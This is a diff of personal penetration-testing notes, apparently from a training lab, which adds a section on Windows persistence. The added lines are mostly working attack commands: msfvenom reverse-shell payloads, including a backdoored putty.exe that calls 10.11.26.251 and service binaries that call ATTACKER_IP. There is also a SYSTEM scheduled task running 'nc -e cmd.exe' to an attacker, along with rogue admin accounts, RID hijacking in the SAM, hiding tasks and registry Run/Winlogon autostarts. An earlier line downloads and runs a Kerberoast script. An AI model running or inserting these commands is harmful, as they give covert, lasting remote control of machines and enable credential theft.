@@ -1,5 +1,10 @@
 - [Commands](#commands)
-  - [Stabilize and Post Exploit windows](#stabilize-and-post-exploit-windows)
+  - [Stabilize /Post Exploit / Persistance windows](#stabilize-post-exploit--persistance-windows)
+    - [Tampering with low users](#tampering-with-low-users)
+    - [Backdoor](#backdoor)
+    - [Create/Modfiy Services](#createmodfiy-services)
+    - [Schedule Tasks](#schedule-tasks)
+    - [Logon as Trigger](#logon-as-trigger)
   - [Powershell](#powershell)
     - [Enumeration](#enumeration)
 - [SMB](#smb)
@@ -123,10 +128,12 @@
 - Invoke Kereberosast script:
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
   
-## Stabilize and Post Exploit windows
+## Stabilize /Post Exploit / Persistance windows
+
+### Tampering with low users
 - Create user + add group admin
   - **net user USERNAME PASS /add**
-  - **net localgroup Administrators/"Backup Operators"/"Remote Management Users"/"Remote Desktop Users" Username /add**
+  - **net localgroup {Administrators/"Backup Operators"| "Remote Management Users" | "Remote Desktop Users"} Username /add**
   
 - User Account Control
   - Less privilege when logged in remotly
@@ -144,8 +151,79 @@
 
 - Change registry values
   - defauld admin RID = 500
-  - Regular users RID >= 1000
+  - Regular users RID >= 1000 ==> Find hex
   - wmic useraccount get name,sid
+  - PsExec64.exe -i -s regedit
+  - In: HKLM\SAM\SAM\Domains\Account\Users\
+    - Change in F to value of admin in HEX(little endian)
+
+### Backdoor
+- find executables and "batizar"
+  - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.11.26.251 lport=4444 -b "\x00" -f exe -o puttyX.exe
+- shortcut
+  - point the shortcut to payload
+
+- File association
+  - HKLM\Software\Classes ==> reference to standard program = script to be loaded
+
+### Create/Modfiy Services
+- **Create**
+  - sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+  - sc.exe start THMservice
+  - create service with msfvenom:
+    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+  
+- **Modify**
+  - sc.exe query state=all
+    - sc.exe qc ServiceName
+  - Important:
+    - binary path name
+    - start_type (auto)
+    - start name (better localsystem)
+    - lsmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
+  - upload and edit:
+    - sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+    - sc.exe qc THMservice3
+
+### Schedule Tasks
+- schtasks
+  - schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+- Hidding the task
+  - remove Security Descriptor
+    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+  -  PsExec64.exe -s -i regedit
+  -  Delete task
+
+
+
+### Logon as Trigger
+- **Executable on startup**
+  - Folder User: AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+  - Folge ALL: ProgramData\Windows\Start Menu\Programs\Startup
+
+- **RunOnce**
+  - Force run via registry
+    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+  - HKCU = current user
+  - HKLM = All users
+  - Run = logon
+  - RunOnce = singletime
+  - Create registry entry
+    - REG_EXPAND_SZ in HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+  
+- **WinLogn**
+  - Executed after authentication
+  - HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+  - Userinit ==> userinit.exe = user profile preferences
+
+- **Logon Scripts**
+  - Only for current user
+  - Variable: UserInitMprLogonScript
+  - Assign logon script to user
+  - HKCU\Environment ==> add Reg_Expand_Sy
 
 ## Powershell
 - .NET framkework: software plattform für windows
@@ -225,6 +303,8 @@
   - Get-ScheduledTask
 - Owner
   - Get-Acl
+
+
 
 # SMB
 - Server Message BLock
